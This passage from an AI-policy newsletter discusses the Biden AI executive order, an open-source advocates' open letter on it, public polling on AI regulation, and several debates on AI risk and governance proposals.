violation.</p><p> Put in charge of Biden&#39;s AI policy, Reed is portrayed as deeply worried about the impact of AI in general and especially its potential confusions over what is real, and about the threat of &#39;Big Tech&#39; in particular.</p><blockquote><p> Nancy Scola: Bruce Reed, White House deputy chief of staff and longtime Democratic Party policy whiz, was sitting in his West Wing office and starting to think maybe people weren&#39;t freaking out enough.</p><p> ……</p><p> The meeting [with Tristan Harris], Reed says, hardened his belief that generative AI is poised to shake the very foundations of American life.</p><p> Bruce Reed: What we&#39;re going to have to prepare for, and guard against is the potential impact of AI on our ability to tell what&#39;s real and what&#39;s not.</p><p> Nancy Scola: The White House&#39;s AI strategy also reflects a big mindset shift in the Democratic Party, which had for years celebrated the American tech industry. Underlying it is Biden&#39;s and Reed&#39;s belief that Big Tech has become arrogant about its alleged positive impact on the world and insulated by a compliant Washington from the consequences of the resulting damage. While both say they&#39;re optimistic about the potential of AI development, they&#39;re also launching a big effort to bring those tech leaders to heel.</p><p> ……</p><p> Now, at 63, Reed finds himself on the same side as many of his longtime skeptics as he has become a tough-on-tech crusader, in favor of a massive assertion of government power against business.</p></blockquote><p> Reed has previously favored proposed regulatory changes that would have been deeply serious errors, and also clearly have been deeply hostile to big tech, also small tech, also all the humans. It is easy to see why one might be concerned.</p><blockquote><p> For fans of the tech industry, the rhetoric was more than bold — it was alarming. “Biden&#39;s Top Tech Advisor Trots Out Dangerous Ideas For &#39;Reforming&#39; Section 230,” was the headline of one post on the influential pro-innovation blog TechDirt, by its editor, Mike Masnick, a regular commentator on legal questions facing the tech industry. “That this is coming from Biden&#39;s top tech advisor is downright scary. It is as destructive as it is ignorant.”</p><p> ……</p><p> “Bruce, from the beginning, was serious about trying to do everything we could to restrain the excessive power of Big Tech,” [antitrust policy expert Tim] Wu says.</p></blockquote><p> There are three in some ways similar and partly overlapping but fundamentally distinct narratives about why we should be very concerned about the executive order in particular, and any government action to regulate or do anything about AI or tech in general.</p><p> Story 1: Regulation will strange the industry the way we have strangled everything else, we will lose our progress and our freedoms and our global leadership etc.</p><p> Story 2: Regulation is premature because we do not yet know what the technology will be like. We will screw it up if we act too soon, lock in bad decisions, stifle innovation, incumbents will end up benefiting. We need to wait longer. Some versions of this include calls to not even consider our options yet for fear we might then use them.</p><p> Story 3: Regulation and also any warnings that AI might ever do more than ordinary mundane harm is a ploy by incumbents to engage in regulatory capture, perhaps combined with a genius marketing strategy. Saying your product might kill everyone is great for business. This is all a business plan of OpenAI, Microsoft, Google and perhaps Anthropic.</p><p> Then all three such stories decry any move towards the ability to do anything as the same as locking in years or decades of then-inevitable regulatory ramp-up and capture, so instead we should do nothing.</p><p> One can easily square Reed&#39;s centrality and profile with story one, or with story two. Those two stories make sense to me. They are good faith, highly reasonable things to be worried about, downsides to weigh against other considerations. If I did not share those concerns, I would advocate going much faster. As I often say, what drives me mad is not seeing that same righteous energy everywhere else.</p><p> If regulations and government actions intended to crack down on big corporations ultimately ended up stifling innovation and progress, while also helping those big corporations, that would not be a shock. It happens a lot. If I thought that stifling AI innovation was an almost entirely bad thing similarly to how it is in most other contexts, I would have a different attitude.</p><p> Whereas it is rather difficult to square Reed&#39;s centrality, along with many of the other facts about AI, with story three. Story three has never made much sense. My direct experience strongly contradicts it. That does not mean that Google and Microsoft are not trying to tilt the rules in their favor. Of course they are. That is what companies will always do, and we must defend against this and be wary.</p><p> But the idea that these efforts, seen by their architects as moves to reign in Big Tech, are about crushing the little guy and maximizing Big Tech profits and power? That they are centrally aimed at regulatory capture, and everyone involved is either bought and paid for or fully hoodwinked, and also everyone who is warning about risks especially existential risks is deluded or lying or both? Yeah, no.</p><p> The profile then touches briefly on the question of what risks to worry about.</p><blockquote><p> In the world of AI, there is a debate what the biggest challenge is. Some think policymakers should try to solve already-known problems like algorithmic bias in job-applicant vetting. Others think policymakers should spend their time trying to prevent seemingly sci-fi existential crises that ever-evolving generative AI might trigger next.</p></blockquote><p> It is weird facing terminology like &#39;seemingly sci-fi&#39; that is viewed as pejorative, yet in a sane world would not be in the context of rapid technological advancement. And of course, we see once again those worried about things like algorithmic bias fighting &#39;to keep the focus on&#39; their cause and treat this as a conflict, while those with existential concerns dutifully continue to say &#39;why not both&#39; and point out that our concerns and the interventions they require will rapidly impact your concerns.</p><p> Reed has the right attitude here.</p><blockquote><p> Reed doesn&#39;t think the White House has to choose between the already-existing AI harms of today and the potential AI harms of tomorrow. “My job is to lose sleep over both,” he says. “I think the president shares the view that both sides of the argument are right.”</p><p> And, he argues, the tech industry has to be made to address those worries. “The main thing we&#39;re saying is that every company needs to take responsibility for whether the products it brings on to the market are safe,” says Reed, “and that&#39;s not too much to ask.”</p></blockquote><h4> Executive Order Open Letter</h4><p> Various accelerationists and advocates of open source, including Marc Andreessen and others at a16z, Yann LeCun and Tyler Cowen, submit an open letter on the EO.</p><p> This letter is a vast improvement on most open source advocacy communications and reactions, and especially a vast improvement over the many unhinged initial reactions to the EO and to the previous writings of Andreessen and LeCun. We have a long way to go, but one must acknowledge a step forward towards real engagement.</p><p> They raise two issues, the first definitional.</p><p> As I noted in my close reading and the thread here (but not the letter) points out, the definition of AI in the Executive Order is poorly chosen, resulting in it being both overly broad and also opening up loopholes. It needs to be fixed. I would be excited to see alternative definitions proposed.</p><p> The focus here on another key definition, that of a &#39;dual-use foundation model.&#39;</p><p> They say:</p><blockquote><p> While the definition appears to target larger AI models, the definition is so broad that it would capture a significant portion of the AI industry, including the open source community. The consequence would be to sweep small companies developing models into complex and technical reporting requirements…</p></blockquote><p> While the current reporting requirements seem easy to fulfill, it is reasonable to expect something more robust in the future, including requiring some actual safety precautions, so let&#39;s look back at this definition that they say is overly broad.</p><blockquote><p> (k)  The term “dual-use foundation model” means an AI model that is trained on broad data; generally uses self-supervision; contains at least tens of billions of parameters; is applicable across a wide range of contexts; and that exhibits, or could be easily modified to exhibit, high levels of performance at tasks that pose a serious risk to security, national economic security, national public health or safety, or any combination of those matters, such as by:</p><p> (i)    substantially lowering the barrier of entry for non-experts to design, synthesize, acquire, or use chemical, biological, radiological, or nuclear (CBRN) weapons;</p><p> (ii)   enabling powerful offensive cyber operations through automated vulnerability discovery and exploitation against a wide range of potential targets of cyber attacks;或者</p><p>(iii)  permitting the evasion of human control or oversight through means of deception or obfuscation.</p></blockquote><p> So what the letter is saying is that they want small companies to be able to train models that fit this definition, without having to report what safety precautions they are taking, and without being required to take safety precautions. Which part of this is too broad?</p><p> Do they think (i) is too broad? That they should be free to substantially lower the barrier to CBRN weapons?</p><p> Do they think that (ii) is too broad? That they should be free to enable powerful offensive cyber operations?</p><p> Or do they think that (iii) is too broad? That systems permitting the evasion of human control or oversight via obfuscation should be permitted?</p><p> Which of these already encompasses much of the AI industry?</p><p> The letter does not say. Nor do they propose an alternative definition or regime.</p><p> Instead, it asserts that small company models will indeed quality under these definitions and do some of these things, but they think at least some of these things are fine to do, presumably without safeguards.</p><p> One could observe that this definition is too broad, in the eyes of those like Marc Andreessen, because it includes any models at all, and they do not want any restrictions placed on anyone.</p><p> Their second compliant is that potentially undue restrictions will be imposed on open source AI. They say that policy has long actively supported open source, and this deviates from that. They claim that it will harm rather than help cybersecurity if we do not allow the development of dual-use open source models, trotting out the general lines about how open source and openness are always good for everything and are why we have nice things. They do not notice or answer the reasons why open source AI models might be a different circumstance to other open source, nor do they address the concerns of others beyond handwave dismissals.</p><p> As many others have, they assert that any regulations requiring that models be shown to be safe ensures domination by a handful of big tech companies. Which is another way of saying that there is no economically reasonable way for others to prove AI models safe.</p><p> To which I say, huge if true. If any regime requiring advanced models be proven safe means only big tech companies can build them, then we have three choices.</p><ol><li> Big Tech companies build the models in a safe fashion, if even they can do so.</li><li> Everyone builds the models, some not in a safe fashion.</li><li> No one builds the models at all, until we can do so in safe fashion.</li></ol><p> They seem to be advocating for option #2 because they hate #1, and while they do not say so here I believe they mostly would hate #3 even more. Whereas I would say, if models pose catastrophic threat, or especially existential threat, and only big companies using closed source could possibly do so in a way we can know is safe, that our choice is between #1 and #3, and that this is the debate one should then have, and #3 makes some very excellent points.</p><p> That is the central dilemma of those who would champion open source, and demand it get special treatment. They want a free pass to not worry about the consequences of their actions. Because they believe as a matter of principle that open source always has good consequences, and that AI does not change this, without any need to address why AI is different.</p><p> They want a regime where anyone can deploy open source models, of any capabilities, without any responsibility of any kind to show their models are safe, or any way to actually render their models safe that cannot easily be undone, or any way to undo model release if problems arise. Ideally, they would like an active thumb on the scale in their favor in their fight against closed source and big tech.</p><p> To achieve this, they deny any downsides of open source of any kind, and also deny that there are meaningful catastrophic or existential dangers from building new entities smarter and more capable than ourselves, instead framing any controls on open source as themselves the existential threat to our civilization. I never see such people speak of any even potential downsides to open source except to dismiss them. To them, open source (and AI) will do everything good that we want, and could never result in anything bad that we do not want. To them open source AI will encourage open and free competition, without endangering national security or our lead in AI. It will give power to the people, without giving the wrong power to the wrong people in any way we need to be concerned about. This will happen automatically, without any need for oversight of any kind. It is all fine.</p><p> While this letter is a large step up from previous communications including many by cosigners of the letter, it continues <a target="_blank" rel="noreferrer noopener" href="https://thedecisionlab.com/podcasts/soldiers-and-scouts-with-julia-galef">to treat all arguments as soldiers</a> and refuses to engage with any meaningful points or admit to any downsides or dangers.</p><p> I see much value in open source in the past and much potential for it to do good in the future, if we can keep it away from sufficiently advanced foundation models. This letter is a step forward towards having a productive discussion of that. To get to that point, we must face the reality of AI and the existence of trade-offs and massive potential externalities and catastrophic and existential dangers in that context. That this time will indeed be different.</p><h4> Executive Order Reactions Continued</h4><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sama/status/1720165289864712541">Sam Altman (CEO OpenAI)</a> : there are some great parts about the AI EO, but as the govt implements it, it will be important not to slow down innovation by smaller companies/research teams.</p><p> I am pro-regulation on frontier systems, which is what openai has been calling for, and against regulatory capture.</p></blockquote><p> A lot of responses assume Altman is the one who got the limit in place as part of a conspiracy for regulatory capture. I am rather confident he didn&#39;t.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.foxnews.com/us/biden-admins-ai-safety-institute-not-sufficient-deal-risks-check-user-procedures-expert">Fox News responds to the Executive Order</a> , saying it is necessary but perhaps is not sufficient. Seems wise, this is merely a first step, limited by what is legally allowed. That is quite the take. The rest of the article does not show much understanding of how any of this works.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/allafarce/status/1719755345931932127">Dave Guarino offers strong practical advice</a> .</p><blockquote><p> Dave Guarino: Thinking about the AI executive order, I think I return to one thought: We should be prioritizing use of AI in the agencies and programs where the *current* status quo is least acceptable. Yes, AI has risks. And… DISABILITY APPLICATIONS ARE TAKING *220* DAYS TO PROCESS.</p><p> This is something that — so far — I have not read in the AI EO or the draft OMB guidance. It has general encouragement to look at uses of AI. But maybe we need an stronger impetus to be trying AI in contexts where the status quo is, effectively, an emergency?</p><p> “Well what if an AI denies a bunch of people disability benefits?” Well then they&#39;d have to appeal and have deeper human review. LIKE MOST PEOPLE HAVE TO *CURRENTLY*.</p></blockquote><p> There are good reasons to worry that enshrining AI systems that make mistakes could make matters much worse in ways that will be hard to undo or correct, even if humans currently make similar mistakes and often similarly discriminate, and that the current system being criminally slow is terrible but this is a &#39;ten guilty men go free rather than convict one innocent one&#39; situation.</p><p> Mostly I agree that the government should treat such delays and navigation difficulties, including those in immigration and tax processing and many others, as emergencies, and urgently work to fix it, and be willing to spend to do so. I am uncertain how much of that fix will involve AI. Presumably the way AI helps right now is it is a multiplier on how fast workers can process information and applications, which could be a big game. If my understanding of government is correct, no one will dare until they have very explicit permission, and a shield against blame. So we need to get them that, and tolerate some errors.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.understandingai.org/p/joe-bidens-ambitious-plan-to-regulate">Timothy Lee highlights</a> the new reporting requirements on foundation models. As I read him, he is confusing &#39;tell me what tests you run&#39; with &#39;thou shalt run tests,&#39; and presuming that any new models now have testing requirements, whereas I read the report as saying they have testing reporting requirements, and an email saying &#39;safety tests? What are safety tests, we are Meta, lol&#39; would technically suffice. Similarly, he wonders what would happen with open source. Of course, this could and likely will evolve into some form of testing requirement.</p><p> It is the right question with regard to open source to then ask, as he does, would a modified open source model then need to be tested again? To which I say, the only valid red teaming of an open source model is to red team it and any possible (not too relatively expensive) modification thereof, since that is what you are releasing.</p><p> But also, it highlights that open source advocates are not merely looking to avoid a ban or restriction on open source. They are looking for special exceptions to the rules any sane civilization would impose, because being open source means you cannot abide by the reasonable rules any sane civilization would impose once models get actively dangerous. That might not happen right at 10^26, but it is coming.</p><p> Unintended Consequences looks at the Executive Order as representing a mix of approaches that attempt to deal with AI&#39;s approach, framed as a strong (future AIs) vs. weak (humanity) situation. Do we delay, subvert, fight or defend a border? Defending a border will not work. Ultimately we cannot fight. Our choices are limited.</p><h4> Quiet Speculations</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/FEFQSGLhJFpqmEhgi/does-davidad-s-uploading-moonshot-work">Proposal by Davidad</a> that we could upload human brains by 2040, maybe even faster, given unlimited funding. I lack the scientific knowledge to evaluate the claim. Comments seem skeptical. I do think that if we can do this with any real chance of success at any affordable price, we should do this, it seems way better than all available alternatives.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/norabelrose/status/1720862603495567604">One method when compute is expense, another when cheap, many such cases</a> .</p><blockquote><p> Nora Belrose: Virtue ethics and deontology are a lot more computationally efficient than consequentialism, so we should expect neural nets to pursue virtues and follow rules rather than maximize utility by default.</p><p> I think consequentialism basically requires explicitly outcome-oriented chain of thought, Monte Carlo tree search, or something similar. I don&#39;t think you&#39;re going to see “learned inner consequentialists” inside a forward pass or whatever.</p><p> Eliezer Yudkowsky: They&#39;re lossy approximations, and we should expect more powerful agents to expend compute on avoiding the losses.</p><p> Nora Belrose: 1. does “agent” just mean “consequentialist” making this circular? 2. what losses are you talking about 3. consequentialism implies compute, but compute doesn&#39;t imply consequentialism, so idk what you&#39;re getting at here</p><p> Eliezer Yudkowsky: It&#39;s meaningless to speak of deontology being computationally cheap, except I suppose in the same way that being a rock as cheap, without it being the case that deontology is doing some task cheaply. That task, or target, is mapping preferred outcomes onto actions.</p><p> Deontology says to implement computationally cheap rules that seem like they should lead, or previously have led, to good outcomes; it is second-order consequentialism. This reflects both the computational limits of humans, and also known biases of our untrusted hardware when we try to implement first-order consequentialism. A very fast mind running on non-self-serving hardware–unlike a human!–can just compute which actions have which consequences, for problems that are simple relative to how much computation it has; and doesn&#39;t need to override “This seems like a good idea” with “but it violates this rule”. To the extent the rule makes sense, it directly perceives that the action won&#39;t have good consequences.</p></blockquote><p> If you have importantly limited compute (and algorithms and heuristics and data and parameters and time and so on), as a human does, then it makes sense to consider using some mix of virtue ethics and deontology in most situations, only pulling out explicit consequentialism in appropriate, mostly bounded contexts.</p><p> As your capabilities improve, doing the consequentialist math makes sense in more situations. At the limit, with unbounded time and resources to make decisions, you would use pure consequentialism combined with good decision theory.</p><p> The same holds for an AI, especially one that is at heart a neural network.</p><p> At current capabilities levels, the AI will use a variety of noisy approximations, heuristics and shortcuts, that will look to us a lot like applying virtue ethics and deontology given what the training set and human feedback look like. This is lossy, things bleed into each other on vibes, so it will also look like exhibiting more &#39;common sense&#39; and sticking to things that closer mimic a human and their intuitions.</p><p> As capabilities improve, those methods will fade away, as the AI groks the ability to use more explicit consequentialism and other more intentional approaches in more and more situations. This will invalidate a lot of the reasons we currently see nice behaviors, and be an important cause of the failure of our current alignment techniques. Again, the same way that this is true in humans.</p><p> It might be wise to recall here <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/p/book-review-going-infinite">the parable of Sam Bankman-Fried</a> .</p><p> <a target="_blank" rel="noreferrer noopener" href="https://worldspiritsockpuppet.com/2023/11/03/the-other-side-of-the-tidal-wave.html">Well worth a ponder.</a></p><blockquote><p> Katja Grace: I guess there&#39;s maybe a 10-20% chance of AI causing human extinction in the coming decades, but I feel more distressed about it than even that suggests—I think because in the case where it doesn&#39;t cause human extinction, I find it hard to imagine life not going kind of off the rails. So many things I like about the world seem likely to be over or badly disrupted with superhuman AI (writing, explaining things to people, friendships where you can be of any use to one another, taking pride in skills, thinking, learning, figuring out how to achieve things, making things, easy tracking of what is and isn&#39;t conscious), and I don&#39;t trust that the replacements will be actually good, or good for us, or that anything will be reversible.</p><p> Even if we don&#39;t die, it still feels like everything is coming to an end.</p></blockquote><p> If AI becomes smarter and more capable than we are, perhaps we will find a way to survive that. What would absolutely not survive that is normality. People always expect normality as the baseline scenario, but that does not actually make sense in a world with smarter things than we are. Either AI progress stalls out, or our world will be transformed. Perhaps for the better, if we make that happen.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720587981306900581/history">How should we think about synthetic bio risk from AI?</a></p><blockquote><p> Eliezer Yudkowsky: I feel unsure about whether to expect serious damage from biology-knowing AIs being misused by humans, before ASIs not answerable to any human kill everyone. It deserves stating aloud that <em>2023 LLMs</em> are very likely not a threat in that way.</p></blockquote><p> Seems clearly right for those available to the public. Anthropic claims that they have had internal builds of Claude where there was indeed danger here. They haven&#39;t proven this or anything, but it seems plausible to me, and I would expect GPT-5-level systems, if released with zero precautions (or open source, which is the effectively the same thing) to pose a serious threat along these lines.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sama/status/1655249663262613507">I am here for the spirit, and 100% here for ignoring the attention and culture wars, but one of these creations is not like the others.</a></p><blockquote><p> Sam Altman: here is an alternative path for society: ignore the culture war. ignore the attention war. make safe agi. make fusion. make people smarter and healthier. make 20 other things of that magnitude.   start radical growth, inclusivity, and optimism.   expand throughout the universe.</p></blockquote><p> I worry that this represents a failure to fully understand that if you make &#39;safe AGI&#39; then you get all the other things automatically, and yes we would get fusion and get cognitive enhancement and space exploration but this is burying the lede.</p><p> One does not simply build &#39;safe&#39; AGI. What would that even mean? General intelligence is not a safe thing. We have no idea how, but in theory you can align it to something. Then, even in the best case, humans would use it to do lots of things, and none of that is &#39;safe.&#39; What you cannot do is make it &#39;safe&#39; any more than you can make a safe free human or a safe useful machine gun.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/BtffzD5yNB4CzSTJe/genetic-fitness-is-a-measure-of-selection-strength-not-the">Kaj Sotala writes a LessWrong post</a> entitled &#39;Genetic fitness is a measure of selection strength, not the selection target&#39; that argues evolution is evidence against the sharp left turn and that we should expect AIs to preserve their core motivations rather than doing something else entirely, and arguments about humans not maximizing genetic fitness are confusions. Kaj notes that evolution instead builds in whatever (randomly initially selected) features turn out to be genetic fitness enhancing, not a drive to maximize genetic fitness itself.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/BtffzD5yNB4CzSTJe/genetic-fitness-is-a-measure-of-selection-strength-not-the?commentId=Wo2vroA6BwowzqoTh">Leogao&#39;s response comment to Kaj is excellent</a> , worth reading for those interested in this question even without reading the OP – you likely already know most of what Kaj is explaining, and Leogao gets down to the question of why the facts imply the conclusion that we would get AIs doing the things we intended to train into them when they gain in capabilities and face different maximization tasks, taking them out of their training distributions. Yes, the AI might well preserve the heuristics and drives that we gave it, but those won&#39;t continue to correspond to the thing we want, the same way that the drives of humans are preserved in modern day but are increasingly not adding up to the thing they were selected to maximize (inclusive genetic fitness).</p><p> What I see is evidence that you are taking the components that previously added up to the thing you wanted, and then you still get those components, but the reasons they added up to the thing you wanted stop applying, and now you have big problems. Or, you apply sufficient selection pressure, and the reasons change to new reasons that apply to the new situation, and you get a different nasty surprise.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1721953074544025738">Patrick McKenzie points out that LLMs are great but so are if-then statements</a> .</p><blockquote><p> Patrick McKenzie: I think it&#39;s possible to simultaneously believe that LLMs are going to create a tremendous amount of business value and that most business value in the next 10 years from things civilians call “AI” will be built with for loops and if statements.</p><p> I&#39;m remembering a particular Japanese insurance company here, which debuted an AI system to enforce the invariant that, if you mail them a claim, you get a response that same month. Now plausibly you might say “That sounds a lot like pedestrian workflow automation and SQL.”</p><p> And it is, but if senior management was actually brought to implement pedestrian workflow automation and SQL by calling it AI and saying they&#39;d be able to brag to their buddies about their new investments in cutting edge technology, then… yay?</p><p> Note that an unfortunate corollary of this is that when people talk about regulating AI they frequently mean regulating for loops and if statements, and some of the people saying that understand exactly what they&#39;re saying and do not consider that a bug at all.</p><p> “Should we regulate for loops and if statements?”</p><p> We inevitably regulate for loops and if statements, because we regulate things that happen in the world and some things happen in the world because of FL&amp;IS. But we should probably not increase reg scope *because* of the FL&amp;IS.</p></blockquote><p> The &#39;do not regulate AI&#39; position is only coherent if you also want to not regulate loops and if statements and everything else people and systems do all day. Which is a coherent position, but one our society very much does not endorse, and the regulations on everything else will apply to AI same as everything else.</p><p> If you automate tasks, then you are making the way you do those tasks legible. If what you are doing is legible, there are lots of reasons why one might be able to object to it, lots of requirements that will upon it be imposed. If anything, this is far worse for if-then statements and for loops, which can be fully understood and thus blamed. If an LLM is involved the whole thing is messier and more deniable, except legally it likely isn&#39;t, and LLMs writing code might be the worst case scenario here as you do not have a human watching to ensure each step is not blameworthy.</p><p> As a big bank or similar system, I would totally look to see how I could safely use LLMs. But I would likely be so far behind the times that a lot of the real value is in the for loops and if statements. If (using AI as a buzzword lets me capture that value) then return(that would be a wise option to pursue).</p><p> It is odd how some, such as Alex Tabarrok here, can reason well about local improvements, while not seeing what those improvements would imply about the bigger picture, here in the context of what are already relatively safe self-driving cars.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ATabarrok/status/1721983990830190924">Alex Tabarrok</a> : I predict that some of my grandchildren will never learn to drive and their kids won&#39;t be allowed to drive.</p></blockquote><p> A world with only fully self-driving cars will be changing in so many other ways. The question is not if the great grandchildren are allowed to drive. The question is, are they around to drive?</p><h4> The Quest for Sane Regulations</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://t.co/IyTx5wEfcL">FLI report on various governance proposals</a> , note PauseAI spokesperson claims they do require burden of proof, I recommend <a target="_blank" rel="noreferrer noopener" href="https://futureoflife.org/wp-content/uploads/2023/04/FLI_Governance_Scorecard_and_Framework.pdf">clicking through to page 3 of the full report</a> if you want to read the diagram.</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda46e63f-85ac-476c-8c63-5220de22c4af_2366x1660.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/dbyfnerygiz04swntfnv" alt="图像"></a></figure><p> Here is FLI&#39;s proposed policy framework:</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F288f9ef5-0b66-44ac-b3f6-f421bb9026e6_1507x930.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/ddu8lzwoctka068uxbae" alt=""></a></figure><p> The motivation here is straightforward and seems right, in a section called “having our cake and eating it”:</p><blockquote><p> Returning to our comparison of AI governance proposals, our analysis revealed a clear split between those that do, and those that don&#39;t, consider AGI-related risk. To see this more clearly, it is convenient to split AI development crudely into two categories: commercial AI and AGI pursuit. By commercial AI, we mean all uses of AI that are currently commercially valuable (eg improved medical diagnostics, self-driving cars, industrial robots, art generation and productivity-boosting large language models), be they for-profit or open-source. By AGI pursuit, we mean the quest to build AGI and ultimately superintelligence that could render humans economically obsolete. Although building such systems is the stated goal of OpenAI, Google DeepMind, and Anthropic, the CEOs of all three companies have acknowledged the grave associated risks and the need to proceed with caution.</p><p> The AI benefits that most people are excited about come from commercial AI, and don&#39;t require AGI pursuit. AGI pursuit is covered by ASL-4 in the FLI SSP, and motivates the compute limits in many proposals: the common theme is for society to enjoy the benefits of commercial AI without recklessly rushing to build more and more powerful systems in a manner that carries significant risk for little immediate gain. In other words, we can have our cake and eat it too. We can have a long and amazing future with this remarkable technology. So let&#39;s not pause AI. Instead, let&#39;s stop training ever-larger models until they meet reasonable safety standards.</p></blockquote><p> Polls tell a consistent story on AI.</p><p> Regular people expect AI to be net negative in their lives. They affirm the existence of a variety of mundane harms and also that there are real existential risks.</p><p> Regular people are supportive of regulation of AI aimed at both these threats. They support essentially every reasonable policy ever polled.</p><p> Regular people do not, however, consider any of this a priority. This is not yet a highly salient issue. The public&#39;s opinions are largely instinctual and shallow, not well-considered, and their voting decisions will for now be made elsewhere.</p><p> I expect salience to rapidly increase. The upcoming 2024 election may be our last that is not centrally about AI as a matter of both campaign strategy and policy. For now, our elections are not about AI.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.axios.com/2023/11/07/ai-regulation-chat-gpt-us-politics-poll">A new Morning Consult poll confirms all of this.</a></p><blockquote><p> Ryan Hearth and Margaret Talev (Axios): Among 15 priorities tested in the survey, regulating the use of AI ranked 11th, with 27% of respondents calling it a top priority and 33% calling it “important, but a lower priority.”</p></blockquote><p> Is the glass half empty or half full there? I could see this either way. I know water is pouring into the glass.</p><blockquote><p> The survey found gender, parenting and partisan gaps.</p><ul><li> 44% of women said it&#39;s not even possible to regulate AI, compared to just 23% of men.</li><li> 31% of men said they would or do let their kids use AI products like chatbots “for any purpose,” but just 4% of women agreed.</li><li> 53% of women would not let their kids use AI at all, compared to 26% of men.</li><li> Parents in urban areas were far more open to their children using AI than parents in the suburbs or rural areas.</li></ul></blockquote><p> I love that half of women say they would not let their kids use AI. Good luck with that.</p><p> The claim that it is &#39;not even possible to regulate AI&#39; is weird, and reminds us how much question framing matters. They never ask that about other things.</p><blockquote><p> 78% of those surveyed said political advertisements that use AI should be required to disclose how AI was used to create the ad. That&#39;s higher than the 64% who want disclosure when AI is used in professional spaces.</p><ul><li> 69% of US adults are concerned about the development of AI, with concerns about “jobs” and “work” and “misinformation” and “privacy,” topping answers to an open-ended question about what worried them.</li></ul></blockquote><p> A lot of this is simple ignorance due to lack of exposure.</p><blockquote><ul><li> Use of AI affects attitudes. Just 12% of those who have never used an AI chatbot think AI could improve their lives, compared to 60% who have used AI often.</li></ul></blockquote><p> If you learn that 60% of people who try a product think it can improve their lives, versus 12% of those who have not, and you have not, what should you think? And what should we expect people to think, as the bots improve and people try them?</p><blockquote><p> Jordan Marlatt, Morning Consult&#39;s lead tech analyst told Axios that those who&#39;ve used generative AI frequently are also the most likely to believe it has benefits — and that it needs regulation.</p></blockquote><p> Over time, support for regulation of AI will grow stronger, and the issue will rise in salience. The question is magnitude of change, not direction.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.thetimes.co.uk/article/dc90dc8e-7b48-11ee-b16e-3bec0b4c7454?shareToken=018253781f6aa59626416dc1140791ac">Matthew Syed writes in The Times UK</a> that all this talk during the Summit of sane regulation is obvious nonsense. From his perspective, these people couldn&#39;t sanely regulate anything, they are in completely over their heads, they are waving hands and talking nonsense. None of these incremental changes will make much difference, and AI is an existential threat. Our only hope is a full moratorium, working towards any other end is naivete.</p><p> He may well be right. A lot of this talk is indeed of ideas that will not work. Even if potential solutions short of one exist, that does not mean our civilization can find, deploy and coordinate on them. A full moratorium could easily be our only viable option. If so, we will need to do that. If that is where we will ultimately end up, does it help to explore our other options first to prove they are lacking, or do we risk fooling ourselves that we have acted? Presumably some of both. I strongly favor exploring the possibility space now. So far we have seen a highly positively surprising result along many fronts. Perhaps, despite all our issues, we can and will rise to the challenge.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/leedsharkey/status/1722341766756536639">Lee Sharkey of Apollo Research on the role of auditing in AI governance</a> , <a target="_blank" rel="noreferrer noopener" href="https://www.apolloresearch.ai/research/causal-framework-ai-auditing">executive summary</a> , <a target="_blank" rel="noreferrer noopener" href="https://thezvi.files.wordpress.com/2023/11/08c1e-auditing_framework_web.pdf">paper.</a> They propose a causal framework:</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff859845a-e59e-4891-b867-2fba2182019c_958x609.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/mquekbkguhsbhrzbtyqj" alt=""></a></figure><blockquote><p> Highlighting the importance of AI systems&#39; available affordances:</p><p> We identify a key node in the causal chain – the affordances available to AI systems – which may be useful in designing regulation. The affordances available to AI systems are the environmental resources and opportunities for affecting the world that are available to it, eg whether it has access to the internet.</p><p> These determine which capabilities the system can currently exercise. They can be constrained through guardrails, staged deployment, prompt filtering, safety requirements for open sourcing, and effective security. One of our key policy recommendations is that proposals to change the affordances available to an AI system should undergo auditing.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7658b5c7-32ce-497c-8e64-b98a38abb3f3_3414x1584.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/vmjoidkody4dfqpqi1yp" alt="图像"></a></figure><p> I wonder. Certainly that seems logical, but also I worry about any auditing that does not assume any given AI will eventually be given any and all affordances, in terms of evaluating risks. That mostly we should care about what they call absolute capabilities.</p><p> There is more here and I may return to it in the future, but am currently short on time.</p><h4> The Week in 